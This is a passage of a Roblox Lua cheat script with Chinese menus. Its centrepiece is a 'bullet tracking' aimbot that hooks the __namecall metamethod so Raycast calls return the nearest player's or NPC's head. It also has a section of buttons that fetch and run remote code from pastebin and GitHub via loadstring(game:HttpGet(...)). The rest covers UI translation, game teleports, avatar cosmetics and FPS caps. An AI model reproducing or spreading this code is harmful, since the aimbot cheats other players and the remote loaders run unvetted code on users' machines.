        local root = character:FindFirstChild("HumanoidRootPart")
        if not head or not root then return false end
        
        return true
    end
    
    local function updatePlayerCache()
        local currentTime = tick()
        if currentTime - lastCacheUpdate < CACHE_UPDATE_INTERVAL then
            return
        end
        lastCacheUpdate = currentTime
        
        playerCache = {}
        
        if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        local localHrp = LocalPlayer.Character.HumanoidRootPart
        local localPos = localHrp.Position
        
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character then
                local skip = false
                
                if main.teamcheck and player.Team == LocalPlayer.Team then
                    skip = true
                end
                
                if not skip and main.friendcheck and LocalPlayer:IsFriendsWith(player.UserId) then
                    skip = true
                end
                
                if not skip then
                    local character = player.Character
                    local root = character:FindFirstChild("HumanoidRootPart")
                    local head = character:FindFirstChild("Head")
                    local humanoid = character:FindFirstChildOfClass("Humanoid")
                    
                    if root and head and humanoid and humanoid.Health > 0 and isAlive(character) then
                        local distance = (root.Position - localPos).Magnitude
                        if distance < main.trackDistance then
                            if main.wallCheck then
                                if isVisible(head) then
                                    table.insert(playerCache, {
                                        head = head,
                                        root = root,
                                        distance = distance,
                                        position = root.Position
                                    })
                                end
                            else
                                table.insert(playerCache, {
                                    head = head,
                                    root = root,
                                    distance = distance,
                                    position = root.Position
                                })
                            end
                        end
                    end
                end
            end
        end
        
        table.sort(playerCache, function(a, b)
            return a.distance < b.distance
        end)
    end
    
    local function updateNPCCache()
        if not main.enablenpc then return end
        
        local currentTime = tick()
        if currentTime - lastCacheUpdate < CACHE_UPDATE_INTERVAL then
            return
        end
        
        npcCache = {}
        
        if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            return
        end
        
        local localHrp = LocalPlayer.Character.HumanoidRootPart
        local localPos = localHrp.Position
        
        for _, object in ipairs(Workspace:GetChildren()) do
            if object:IsA("Model") then
                local humanoid = object:FindFirstChildOfClass("Humanoid")
                local hrp = object:FindFirstChild("HumanoidRootPart") or object.PrimaryPart
                local head = object:FindFirstChild("Head")
                
                if humanoid and hrp and head and humanoid.Health > 0 and isAlive(object) then
                    local isPlayer = false
                    for _, pl in ipairs(Players:GetPlayers()) do
                        if pl.Character == object then
                            isPlayer = true
                            break
                        end
                    end
                    
                    if not isPlayer then
                        local distance = (hrp.Position - localPos).Magnitude
                        if distance < main.trackDistance then
                            if main.wallCheck then
                                if isVisible(head) then
                                    table.insert(npcCache, {
                                        head = head,
                                        hrp = hrp,
                                        distance = distance,
                                        position = hrp.Position
                                    })
                                end
                            else
                                table.insert(npcCache, {
                                    head = head,
                                    hrp = hrp,
                                    distance = distance,
                                    position = hrp.Position
                                })
                            end
                        end
                    end
                end
            end
        end
        
        table.sort(npcCache, function(a, b)
            return a.distance < b.distance
        end)
    end
    
    local function getClosestHead()
        if not main.enable then return nil end
        updatePlayerCache()
        
        if #playerCache > 0 then
            return playerCache[1].head
        end
        return nil
    end
    
    local function getClosestNpcHead()
        if not main.enablenpc then return nil end
        updateNPCCache()
        
        if #npcCache > 0 then
            return npcCache[1].head
        end
        return nil
    end
    
    _G.BulletTrack = main
    
    old = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        
        if method == "Raycast" and not checkcaller() then
            local origin = args[1] or Camera.CFrame.Position
            
            if main.enable then
                local closestHead = getClosestHead()
                if closestHead and closestHead.Parent then
                    return {
                        Instance = closestHead,
                        Position = closestHead.Position,
                        Normal = (origin - closestHead.Position).Unit,
                        Material = Enum.Material.Plastic,
                        Distance = (closestHead.Position - origin).Magnitude
                    }
                end
            end
            
            if main.enablenpc then
                local closestNpcHead = getClosestNpcHead()
                if closestNpcHead and closestNpcHead.Parent then
                    return {
                        Instance = closestNpcHead,
                        Position = closestNpcHead.Position,
                        Normal = (origin - closestNpcHead.Position).Unit,
                        Material = Enum.Material.Plastic,
                        Distance = (closestNpcHead.Position - origin).Magnitude
                    }
                end
            end
        end
        return old(self, ...)
    end))
    
    if RunService:IsClient() then
        RunService.Heartbeat:Connect(function()
            if main.enable then
                updatePlayerCache()
            end
            if main.enablenpc then
                updateNPCCache()
            end
        end)
    end
    
    about:Toggle("开启/关闭子弹追踪", "BulletTrack", false, function(state)
        main.enable = state
        if state then
            updatePlayerCache()
        else
            playerCache = {}
        end
    end)
    
    about:Toggle("队伍验证", "TeamCheck", false, function(state)
        main.teamcheck = state
        playerCache = {}
    end)
    
    about:Toggle("好友验证", "FriendCheck", false, function(state)
        main.friendcheck = state
        playerCache = {}
    end)
    
    about:Toggle("NPC子弹追踪", "NPCBulletTrack", false, function(state)
        main.enablenpc = state
        if state then
            updateNPCCache()
        else
            npcCache = {}
        end
    end)
    
    about:Toggle("活体检测", "AliveCheck", false, function(state)
        main.aliveCheck = state
        playerCache = {}
        npcCache = {}
        if main.enable then
            updatePlayerCache()
        end
        if main.enablenpc then
            updateNPCCache()
        end
    end)
    
    about:Toggle("墙体检测", "WallCheck", false, function(state)
        main.wallCheck = state
        playerCache = {}
        npcCache = {}
        if main.enable then
            updatePlayerCache()
        end
        if main.enablenpc then
            updateNPCCache()
        end
    end)
    
    about:Slider("追踪距离", "TrackDistance", 500, 50, 2000, false, function(value)
        main.trackDistance = value
        playerCache = {}
        npcCache = {}
        if main.enable then
            updatePlayerCache()
        end
        if main.enablenpc then
            updateNPCCache()
        end
    end)
end)

run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        if _G.BulletTrack and _G.BulletTrack.enable then
            
        end
    end)
end)

run(function()
    local Players = game:GetService("Players")
    
    Players.PlayerRemoving:Connect(function()
        
    end)
end)

local about = PIJIAOBEN:section("其他注入器", false)

about:Button("syn", function()
  loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))()
end)
about:Button("syn2", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))()
end)
about:Button("阿尔宙斯V3", function()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
end)     
about:Button("水滴注入器", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/crceck123/roblox-script/main/hydrogen_skin_for_evon.lua"))()
end)

local about = PIJIAOBEN:section("加入其他服务器/游戏", false)
local run = function(func) func() end

run(function()
    local gameList = {
        {name = "极速传奇", id = 3101667897},
        {name = "鲨口生求2", id = 8908228901},
        {name = "监狱人生", id = 155615604},
        {name = "忍者传奇", id = 3956818381},
        {name = "Break in", id = 1318971886},
        {name = "自然灾害生存", id = 189707},
        {name = "力量传奇", id = 3623096087},
        {name = "餐厅大亨2", id = 3398014311},
        
        {name = "宠物模拟器99", id = 6428883829},
        {name = "农场模拟器", id = 1304589227},
        {name = "采矿模拟器", id = 6135357899},
        {name = "大亨模拟器", id = 1844618970},
        {name = "发型模拟器", id = 10544864600},
        {name = "武器模拟器", id = 8384872237},
        
        {name = "彩虹朋友", id = 6872265039},
        {name = "门", id = 6516141723},
        {name = "灯塔", id = 7318977327},
        {name = "逃生房", id = 9087401012},
        {name = "致命公司", id = 9646825774},
        {name = "恐怖酒店", id = 9932641247},
        
        {name = "布鲁克黑文", id = 4924922222},
        {name = "收养我", id = 920587237},
        {name = "机甲战争", id = 10409701476},
        {name = "皇家高中", id = 10162927896},
        {name = "梦幻家园", id = 4345344080},
        
        {name = "冲突", id = 7141568546},
        {name = "街区战斗", id = 9125849471},
        {name = "SB格斗", id = 10252183831},
        {name = "超能力格斗", id = 5125457760},
        {name = "传奇格斗", id = 6793688702},
        
        {name = "军队模拟器", id = 2680928287},
        {name = "僵尸起义", id = 3506833665},
        {name = "RBLX战争", id = 4769604914},
        {name = "战区", id = 6886857129},
        {name = "狙击手", id = 4831568045},
        
        {name = "汽车大亨", id = 3245227284},
        {name = "披萨大亨", id = 1494580807},
        {name = "游乐园大亨", id = 8258508852},
        {name = "购物中心大亨", id = 4711749966},
        {name = "酒店大亨", id = 3827451625},
        
        {name = "越狱", id = 2442804977},
        {name = "谋杀之谜2", id = 9338002133},
        {name = "间谍", id = 6935114469},
        {name = "倒计时", id = 7053266494},
        {name = "下水道", id = 9557237248},
        {name = "建筑模拟器", id = 5372314644},
        
        {name = "工作吧", id = 2970301419},
        {name = "过山车", id = 5282906834},
        {name = "赛车手", id = 2858373443},
        {name = "挖掘", id = 11554442389},
        {name = "滑雪", id = 9562645286}
    }
    
    _G.GameData = {
        list = gameList,
        getNames = function()
            local names = {}
            for _, game in ipairs(gameList) do
                table.insert(names, game.name)
            end
            return names
        end,
        getGameId = function(name)
            for _, game in ipairs(gameList) do
                if game.name == name then
                    return game.id
                end
            end
            return nil
        end
    }
end)

run(function()
    local selectedGameId = _G.GameData.list[1].id
    local TeleportService = game:GetService("TeleportService")
    local Players = game:GetService("Players")
    local gameNames = _G.GameData.getNames()
    
    about:Dropdown("选择游戏", "GameSelector", gameNames, function(selectedGame)
        selectedGameId = _G.GameData.getGameId(selectedGame)
    end)
    
    about:Button("加入游戏", function()
        local player = Players.LocalPlayer
        if not player then return end
        
        local success, err = pcall(function()
            TeleportService:Teleport(selectedGameId, player)
        end)
        
        if not success then
            pcall(function()
                TeleportService:TeleportToPlaceInstance(selectedGameId, game.PlaceId, player)
            end)
        end
    end)
end)

run(function()
    local TeleportService = game:GetService("TeleportService")
    
    TeleportService.TeleportInitFailed:Connect(function(player, placeId, errorMessage)
        
    end)
end)

local about = PIJIAOBEN:section("翻译", false)

local run = function(func) func() end

run(function()
    _G.TranslationConfig = {
        Active = false,
        Mode = "智能翻译",
        Speed = 2,
        TranslateNumbers = false,
        TranslateSymbols = false,
        TranslateNames = false,
        TranslateUI = true,
        TranslateChat = true,
        TargetLanguage = "zh-CN"
    }
end)


run(function()
    _G.TranslationConstants = {
        TARGET_LANGUAGE = "zh-CN",
        MAX_TEXT_LENGTH = 5000, 
        
        DANGEROUS_COMMANDS = {
            "neon", "shine", "ghost", "gold", "spin", 
            "bighead", "smallhead", "giantdwarf", "squash"
        },
        
        SUPPORTED_UI_TYPES = {
            "TextLabel", "TextButton", "TextBox", 
            "Frame", "ScrollingFrame", "ImageButton", "ImageLabel"
        },
        
        LANGUAGE_PATTERNS = {
            ["zh-CN"] = {
                pattern = "[\199-\244][\128-\191]*[\128-\191]",
                exclude = "[\227][\128-\191][\128-\191]"
            },
            ["zh-TW"] = {
                pattern = "[\227][\128-\191][\128-\191]"
            },
            ["ja"] = {
                pattern = "[\227-\229][\128-\191][\128-\191]"
            },
            ["ko"] = {
                pattern = "[\234-\235][\128-\191][\128-\191]"
            },
            ["ar"] = {
                pattern = "[\216-\219][\128-\191]"
            },
            ["ru"] = {
                pattern = "[\208-\209][\128-\191]"
            },
            ["th"] = {
                pattern = "[\224-\231][\128-\191]"
            },
            ["en"] = {
                pattern = "[A-Za-z]",
                exclude = "[\199-\244][\128-\191]*[\128-\191]"
            }
        }
    }
end)

run(function()
    _G.TranslationServices = {
        HttpService = game:GetService("HttpService"),
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        Chat = game:GetService("Chat"),
        
        player = game:GetService("Players").LocalPlayer,
        playerGui = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"),
        CoreGui = game:GetService("CoreGui")
    }
end)

run(function()
    _G.TranslationUtils = {
        translatedCache = {},
        translatedObjects = {},
        connection = nil,
        
        isDangerousText = function(text)
            if not text or type(text) ~= "string" then return false end
            local lowerText = text:lower()
            for _, cmd in ipairs(_G.TranslationConstants.DANGEROUS_COMMANDS) do
                if lowerText:find(cmd) then
                    return true
                end
            end
            return false
        end,
        
        shouldSkipTranslation = function(text)
            if not text or text == "" or _G.TranslationUtils.translatedCache[text] then
                return true
            end
            
            if text:match("^%s*$") then
                _G.TranslationUtils.translatedCache[text] = text
                return true
            end
            
            if not _G.TranslationConfig.TranslateNumbers and text:match("^[0-9%.%s,:/%%$#@!%^%&%*%(%)%-_=+%[%]{}|;:'\",.<>/?]+$") then
                _G.TranslationUtils.translatedCache[text] = text
                return true
            end
            
            if not _G.TranslationConfig.TranslateSymbols and text:match("^[^%w%s]+$") then
                _G.TranslationUtils.translatedCache[text] = text
                return true
            end
            
            if #text > _G.TranslationConstants.MAX_TEXT_LENGTH or _G.TranslationUtils.isDangerousText(text) then
                _G.TranslationUtils.translatedCache[text] = text
                return true
            end
            
            return false
        end,
        
        detectLanguage = function(text)
            if not text or type(text) ~= "string" or text == "" then
                return "en"
            end
            
            local patterns = _G.TranslationConstants.LANGUAGE_PATTERNS
            
            if text:match(patterns["zh-CN"].pattern) and 
               (not patterns["zh-CN"].exclude or not text:match(patterns["zh-CN"].exclude)) then
                return "zh-CN"
            end
            
            if text:match(patterns["zh-TW"].pattern) then
                return "zh-TW"
            end
            
            if text:match(patterns["ja"].pattern) then
                return "ja"
            end
            
            if text:match(patterns["ko"].pattern) then
                return "ko"
            end
            
            if text:match(patterns["ar"].pattern) then
                return "ar"
            end
            
            if text:match(patterns["ru"].pattern) then
                return "ru"
            end
            
            if text:match(patterns["th"].pattern) then
                return "th"
            end
            
            return "en"
        end,
        
        hasTextContent = function(gui)
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                return gui.Text and gui.Text ~= ""
            elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then
                return gui:GetAttribute("Text") or gui.Name ~= ""
            end
            return false
        end,
        
        getTextContent = function(gui)
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                return gui.Text
            elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then
                return gui:GetAttribute("Text") or gui.Name
            end
            return nil
        end,
        
        setTextContent = function(gui, text)
            if gui:IsA("TextLabel") or gui:IsA("TextButton") or gui:IsA("TextBox") then
                gui.Text = text
            elseif gui:IsA("ImageButton") or gui:IsA("ImageLabel") then
                gui:SetAttribute("OriginalText", _G.TranslationUtils.getTextContent(gui))
                gui:SetAttribute("Text", text)
            end
        end,
        
        splitText = function(text, maxLength)
            local parts = {}
            local currentPos = 1
            while currentPos <= #text do
                local endPos = math.min(currentPos + maxLength - 1, #text)
                table.insert(parts, text:sub(currentPos, endPos))
                currentPos = endPos + 1
            end
            return parts
        end
    }
end)

run(function()
    local HttpService = _G.TranslationServices.HttpService
    local playerGui = _G.TranslationServices.playerGui
    local CoreGui = _G.TranslationServices.CoreGui
    local Chat = _G.TranslationServices.Chat
    local RunService = _G.TranslationServices.RunService
    
    _G.TranslationCore = {
        translateWithGoogle = function(text, targetLang)
            if not text or text == "" then return text end
            
            local sourceLang = _G.TranslationUtils.detectLanguage(text)
            
          
            if sourceLang == targetLang then
                return text
            end
            
          
            local url = string.format(
                "https://translate.googleapis.com/translate_a/single?client=gtx&sl=%s&tl=%s&dt=t&q=%s",
                sourceLang,
                targetLang,
                HttpService:UrlEncode(text)
            )
            
            local success, response = pcall(function()
                return game:HttpGet(url)
            end)
            
            if success and response then
                local ok, data = pcall(HttpService.JSONDecode, HttpService, response)
                if ok and data and data[1] then
                    local translatedText = ""
                    for _, segment in ipairs(data[1]) do
                        if segment[1] then
                            translatedText = translatedText .. segment[1]
                        end
                    end
                    
                    if translatedText ~= "" and translatedText ~= text then
                        return translatedText
                    end
                end
            end
            
            return text
        end,
        
        translate = function(text)
            if _G.TranslationUtils.shouldSkipTranslation(text) then
                return _G.TranslationUtils.translatedCache[text] or text
            end
            
            local translatedText
            
           
            if _G.TranslationConfig.Mode == "仅翻译英文" then
                if _G.TranslationUtils.detectLanguage(text) == "en" then
                    translatedText = _G.TranslationCore.translateWithGoogle(text, _G.TranslationConfig.TargetLanguage)
                else
                    translatedText = text
                end
            elseif _G.TranslationConfig.Mode == "仅翻译日文" then
                if _G.TranslationUtils.detectLanguage(text) == "ja" then
                    translatedText = _G.TranslationCore.translateWithGoogle(text, _G.TranslationConfig.TargetLanguage)
                else
                    translatedText = text
                end
            elseif _G.TranslationConfig.Mode == "仅翻译韩文" then
                if _G.TranslationUtils.detectLanguage(text) == "ko" then
                    translatedText = _G.TranslationCore.translateWithGoogle(text, _G.TranslationConfig.TargetLanguage)
                else
                    translatedText = text
                end
            else
                
                translatedText = _G.TranslationCore.translateWithGoogle(text, _G.TranslationConfig.TargetLanguage)
            end
            
            if translatedText and translatedText ~= text then
                _G.TranslationUtils.translatedCache[text] = translatedText
                return translatedText
            end
            
            _G.TranslationUtils.translatedCache[text] = text
            return text
        end,
        
        scanAndTranslate = function()
            local count = 0
            
            if _G.TranslationConfig.TranslateUI then
                for _, gui in ipairs(playerGui:GetDescendants()) do
                    if not _G.TranslationUtils.translatedObjects[gui] and _G.TranslationUtils.hasTextContent(gui) then
                        local text = _G.TranslationUtils.getTextContent(gui)
                        if text and text ~= "" then
                            _G.TranslationUtils.translatedObjects[gui] = true
                            local translatedText = _G.TranslationCore.translate(text)
                            if _G.TranslationUtils.getTextContent(gui) == text then
                                _G.TranslationUtils.setTextContent(gui, translatedText)
                                count = count + 1
                            end
                        end
                    end
                end
                
                for _, gui in ipairs(CoreGui:GetDescendants()) do
                    if not _G.TranslationUtils.translatedObjects[gui] and _G.TranslationUtils.hasTextContent(gui) then
                        local text = _G.TranslationUtils.getTextContent(gui)
                        if text and text ~= "" then
                            _G.TranslationUtils.translatedObjects[gui] = true
                            local translatedText = _G.TranslationCore.translate(text)
                            if _G.TranslationUtils.getTextContent(gui) == text then
                                _G.TranslationUtils.setTextContent(gui, translatedText)
                                count = count + 1
                            end
                        end
                    end
                end
            end
            
            if _G.TranslationConfig.TranslateChat then
                for _, message in ipairs(Chat:GetChildren()) do
                    if message:IsA("TextLabel") and not _G.TranslationUtils.translatedObjects[message] then
                        local text = message.Text
                        if text and text ~= "" then
                            _G.TranslationUtils.translatedObjects[message] = true
                            local translatedText = _G.TranslationCore.translate(text)
                            if message.Text == text then
                                message.Text = translatedText
                                count = count + 1
                            end
                        end
                    end
                end
            end
            
            return count
        end,
        
        updateTranslation = function()
            if _G.TranslationUtils.connection then
                _G.TranslationUtils.connection:Disconnect()
                _G.TranslationUtils.connection = nil
            end
            
            if _G.TranslationConfig.Active then
                local count = _G.TranslationCore.scanAndTranslate()
                
                _G.TranslationUtils.connection = RunService.Heartbeat:Connect(function()
                    if _G.TranslationConfig.Active then
                        local count = _G.TranslationCore.scanAndTranslate()
                        task.wait(2 / _G.TranslationConfig.Speed)
                    end
                end)
            end
        end,
        
        clearCache = function()
            _G.TranslationUtils.translatedCache = {}
            _G.TranslationUtils.translatedObjects = {}
        end
    }
end)

run(function()
    about:Toggle("自动翻译", "TranslationActive", false, function(state)
        _G.TranslationConfig.Active = state
        _G.TranslationCore.updateTranslation()
    end)

    about:Dropdown("翻译模式", "TranslationMode", {"智能翻译", "快速翻译", "精确翻译", "仅翻译英文", "仅翻译日文", "仅翻译韩文"}, function(value)
        _G.TranslationConfig.Mode = value
    end)

    about:Slider("翻译速度", "TranslationSpeed", 2, 1, 10, function(value)
        _G.TranslationConfig.Speed = value
        if _G.TranslationConfig.Active then
            _G.TranslationCore.updateTranslation()
        end
    end)

    about:Toggle("翻译数字", "TranslateNumbers", false, function(state)
        _G.TranslationConfig.TranslateNumbers = state
    end)

    about:Toggle("翻译符号", "TranslateSymbols", false, function(state)
        _G.TranslationConfig.TranslateSymbols = state
    end)

    about:Toggle("翻译名称", "TranslateNames", false, function(state)
        _G.TranslationConfig.TranslateNames = state
    end)

    about:Toggle("翻译界面", "TranslateUI", true, function(state)
        _G.TranslationConfig.TranslateUI = state
        if _G.TranslationConfig.Active then
            _G.TranslationCore.updateTranslation()
        end
    end)

    about:Toggle("翻译聊天", "TranslateChat", true, function(state)
        _G.TranslationConfig.TranslateChat = state
        if _G.TranslationConfig.Active then
            _G.TranslationCore.updateTranslation()
        end
    end)

    about:Button("立即翻译", function()
        local count = _G.TranslationCore.scanAndTranslate()
        
    end)

    about:Button("清空缓存", function()
        _G.TranslationCore.clearCache()
        
    end)
end)


run(function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
       
    end)
end)

local about = PIJIAOBEN:section("美化", false)

local run = function(func) func() end

run(function()
    _G.BeautifyConfig = {
        Headless = false,
        BrokenLeg = false,
        DeleteHats = false,
        RainbowCharacter = false,
        DeleteAllClothes = false
    }
end)

run(function()
    _G.BeautifyServices = {
        Players = game:GetService("Players"),
        RunService = game:GetService("RunService"),
        LocalPlayer = game:GetService("Players").LocalPlayer
    }
end)

run(function()
    local Players = _G.BeautifyServices.Players
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    _G.HeadlessModule = {
        enable = function()
            local char = LocalPlayer.Character
            if char then
                local head = char:FindFirstChild("Head")
                if head then
                    head.Transparency = 1
                    local decal = head:FindFirstChildOfClass("Decal")
                    if decal then
                        decal:Destroy()
                    end
                end
            end
        end,
        
        disable = function()
            local char = LocalPlayer.Character
            if char then
                local head = char:FindFirstChild("Head")
                if head then
                    head.Transparency = 0
                end
            end
        end
    }
    
    about:Toggle("美化无头", "BeautifyHeadless", false, function(state)
        _G.BeautifyConfig.Headless = state
        if state then
            _G.HeadlessModule.enable()
        else
            _G.HeadlessModule.disable()
        end
    end)
end)

run(function()
    local Players = _G.BeautifyServices.Players
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    _G.BrokenLegModule = {
        enable = function()
            local char = LocalPlayer.Character
            if char then
                local rightLeg = char:FindFirstChild("RightLeg") or char:FindFirstChild("Right Leg")
                if rightLeg then
                    for _, child in pairs(rightLeg:GetChildren()) do
                        if child:IsA("SpecialMesh") then
                            child:Destroy()
                        end
                    end
                    
                    local specialMesh = Instance.new("SpecialMesh")
                    specialMesh.MeshId = "rbxassetid://101851696"
                    specialMesh.TextureId = "rbxassetid://115727863"
                    specialMesh.Scale = Vector3.new(1, 1, 1)
                    specialMesh.Parent = rightLeg
                end
            end
        end,
        
        disable = function()
            local char = LocalPlayer.Character
            if char then
                local rightLeg = char:FindFirstChild("RightLeg") or char:FindFirstChild("Right Leg")
                if rightLeg then
                    for _, child in pairs(rightLeg:GetChildren()) do
                        if child:IsA("SpecialMesh") then
                            child:Destroy()
                        end
                    end
                end
            end
        end
    }
    
    about:Toggle("美化断腿", "BeautifyBrokenLeg", false, function(state)
        _G.BeautifyConfig.BrokenLeg = state
        if state then
            _G.BrokenLegModule.enable()
        else
            _G.BrokenLegModule.disable()
        end
    end)
end)

run(function()
    local Players = _G.BeautifyServices.Players
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    _G.DeleteHatsModule = {
        enable = function()
            local char = LocalPlayer.Character
            if char then
                for _, accessory in pairs(char:GetChildren()) do
                    if accessory:IsA("Accessory") then
                        accessory:Destroy()
                    end
                end
            end
        end,
        
        disable = function()
           
        end
    }
    
    about:Toggle("删除帽子", "DeleteHats", false, function(state)
        _G.BeautifyConfig.DeleteHats = state
        if state then
            _G.DeleteHatsModule.enable()
        end
    end)
end)

run(function()
    local Players = _G.BeautifyServices.Players
    local RunService = _G.BeautifyServices.RunService
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    local rainbowConnection = nil
    
    _G.RainbowModule = {
        enable = function()
            if rainbowConnection then
                rainbowConnection:Disconnect()
            end
            
            rainbowConnection = RunService.RenderStepped:Connect(function()
                local char = LocalPlayer.Character
                if not char then return end
                
                local hue = (tick() % 5) / 5
                local rainbowColor = Color3.fromHSV(hue, 1, 1)
                
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
                        part.Color = rainbowColor
                        
                        local glow = part:FindFirstChild("RainbowGlow") or Instance.new("SurfaceAppearance")
                        glow.Name = "RainbowGlow"
                        glow.ColorMap = "rbxassetid://9018903989"
                        glow.Parent = part
                    end
                end
            end)
        end,
        
        disable = function()
            if rainbowConnection then
                rainbowConnection:Disconnect()
                rainbowConnection = nil
            end
            
            local char = LocalPlayer.Character
            if char then
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("BasePart") then
                        part.Color = Color3.fromRGB(163, 162, 165)
                        
                        local glow = part:FindFirstChild("RainbowGlow")
                        if glow then
                            glow:Destroy()
                        end
                    end
                end
            end
        end
    }
    
    about:Toggle("彩虹人物", "RainbowCharacter", false, function(state)
        _G.BeautifyConfig.RainbowCharacter = state
        if state then
            _G.RainbowModule.enable()
        else
            _G.RainbowModule.disable()
        end
    end)
end)


run(function()
    local Players = _G.BeautifyServices.Players
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    _G.DeleteClothesModule = {
        enable = function()
            local char = LocalPlayer.Character
            if char then
                for _, part in pairs(char:GetChildren()) do
                    if part:IsA("Shirt") or part:IsA("Pants") or part:IsA("ShirtGraphic") then
                        part:Destroy()
                    end
                end
            end
        end,
        
        disable = function()
            
        end
    }
    
    about:Toggle("删除全部衣服", "DeleteAllClothes", false, function(state)
        _G.BeautifyConfig.DeleteAllClothes = state
        if state then
            _G.DeleteClothesModule.enable()
        end
    end)
end)

run(function()
    local Players = _G.BeautifyServices.Players
    local LocalPlayer = _G.BeautifyServices.LocalPlayer
    
    LocalPlayer.CharacterAdded:Connect(function()
        
        task.wait(0.5)
        
        if _G.BeautifyConfig.Headless then
            _G.HeadlessModule.enable()
        end
        
        if _G.BeautifyConfig.BrokenLeg then
            _G.BrokenLegModule.enable()
        end
        
        if _G.BeautifyConfig.DeleteHats then
            _G.DeleteHatsModule.enable()
        end
        
        if _G.BeautifyConfig.RainbowCharacter then
            _G.RainbowModule.enable()
        end
        
        if _G.BeautifyConfig.DeleteAllClothes then
            _G.DeleteClothesModule.enable()
        end
    end)
end)

local FPS = PIJIAOBEN:section("FPS", false)

local FPSModule = {
    CurrentFPS = 60,
    DefaultFPS = 60,
    FPSLocked = false,
    FPSVisible = false,
    MSVisible = false,
    LockLoop = nil,
    UpdateConnection = nil,
    DisplayGui = nil,
    FPSText = nil,
    MSText = nil,
    FPSCount = 0,
    LastTime = nil,
    FPSEnabled = false  
}

local fpsOptions = {"30", "60", "75", "120", "144", "165", "240", "360", "max"}

local function SendNotification(text, duration)
    pcall(function()
        XPHUBNotification:Notification({
            Title = "FPS控制",
            Text = text,
            Icon = "rbxassetid://136169594232359",
            Duration = duration or 3
        })
    end)
end

FPS:Textbox("设置FPS", "FPS", "输入", function(value)
    local newFPS = tonumber(value)
    if newFPS and newFPS > 0 and newFPS <= 360 then
        FPSModule.CurrentFPS = newFPS
        if FPSModule.FPSEnabled or FPSModule.FPSLocked then
            setfpscap(FPSModule.CurrentFPS)
        end
    elseif value:lower() == "max" then
        FPSModule.CurrentFPS = 999
        if FPSModule.FPSEnabled or FPSModule.FPSLocked then
            setfpscap(999)
        end
    else
        SendNotification("无效FPS数值 (请输入1-360之间的数字或 'max')", 4)
    end
end)

FPS:Dropdown("FPS上限", "", fpsOptions, function(selected)
    if selected == "max" then
        FPSModule.CurrentFPS = 999
        if FPSModule.FPSEnabled or FPSModule.FPSLocked then
            setfpscap(999)
        end
    else
        local value = tonumber(selected)
        if value then
            FPSModule.CurrentFPS = value
            if FPSModule.FPSEnabled or FPSModule.FPSLocked then
                setfpscap(value)
            end
        end
    end
end)

FPS:Toggle("开启FPS", "", false, function(state)
    FPSModule.FPSEnabled = state
    if state then
        setfpscap(FPSModule.CurrentFPS)
    else
        setfpscap(0)
        if FPSModule.FPSLocked then
            FPSModule.FPSLocked = false
            if FPSModule.LockLoop then
                FPSModule.LockLoop:Disconnect()
                FPSModule.LockLoop = nil
            end
        end
    end
end)

FPS:Toggle("锁定FPS", "", false, function(state)
    FPSModule.FPSLocked = state
    
    if FPSModule.LockLoop then
        FPSModule.LockLoop:Disconnect()
        FPSModule.LockLoop = nil
    end
    
    if state then
        FPSModule.LockLoop = game:GetService("RunService").Heartbeat:Connect(function()
            setfpscap(FPSModule.CurrentFPS)
        end)
    end
end)

FPS:Button("恢复默认", function()
    FPSModule.CurrentFPS = FPSModule.DefaultFPS
    if FPSModule.FPSEnabled or FPSModule.FPSLocked then
        setfpscap(FPSModule.CurrentFPS)
    end
    SendNotification("已恢复默认FPS: " .. FPSModule.DefaultFPS, 2)
end)

FPS:Toggle("显示FPS", "", false, function(state)
    FPSModule.FPSVisible = state
    FPSModule:UpdateDisplay()
end)

FPS:Toggle("显示MS", "", false, function(state)
    FPSModule.MSVisible = state
    FPSModule:UpdateDisplay()
end)

function FPSModule:UpdateDisplay()
    if self.FPSVisible or self.MSVisible then
        if not self.DisplayGui then
            self.DisplayGui = Instance.new("ScreenGui")
            self.DisplayGui.Name = "FPS_MS_Display"
            self.DisplayGui.ResetOnSpawn = false
            self.DisplayGui.Parent = game:GetService("CoreGui")
            
            self.FPSText = Instance.new("TextLabel")
            self.FPSText.Name = "FPSText"
            self.FPSText.Parent = self.DisplayGui
            self.FPSText.Size = UDim2.new(0, 200, 0, 35)
            self.FPSText.Position = UDim2.new(1, -210, 0, 2)
            self.FPSText.Text = "FPS: 0.0"
            self.FPSText.BackgroundTransparency = 1
            self.FPSText.TextColor3 = Color3.new(0, 255, 0)
            self.FPSText.TextSize = 25
            self.FPSText.Font = Enum.Font.SourceSansBold
            self.FPSText.TextXAlignment = Enum.TextXAlignment.Right
            
            self.MSText = Instance.new("TextLabel")
            self.MSText.Name = "MSText"
            self.MSText.Parent = self.DisplayGui
            self.MSText.Size = UDim2.new(0, 200, 0, 35)
            self.MSText.Position = UDim2.new(1, -210, 0, 37)  
            self.MSText.Text = "MS: 0.0"
            self.MSText.BackgroundTransparency = 1
